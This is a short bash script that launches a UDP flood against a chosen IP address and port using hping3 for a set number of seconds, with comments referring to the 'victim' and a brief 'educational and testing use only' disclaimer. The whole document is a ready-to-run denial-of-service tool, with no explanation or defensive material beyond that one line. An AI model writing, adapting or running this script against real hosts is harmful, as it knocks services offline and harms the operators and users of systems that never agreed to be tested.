#!/bin/bash

# UDP Flood Script using hping3
# ⚠️ For educational and testing use only!

TARGET_IP="IP"     # Replace with victim IP
TARGET_PORT=80              # Replace with open UDP port on target
DURATION=10                 # Duration in seconds

echo "[+] Starting UDP flood on $TARGET_IP:$TARGET_PORT for $DURATION seconds..."
END=$((SECONDS + DURATION))

while [ $SECONDS -lt $END ]; do
    hping3 --udp -p $TARGET_PORT -d 1024 --flood $TARGET_IP > /dev/null 2>&1
done

echo "[+] UDP Flood completed."
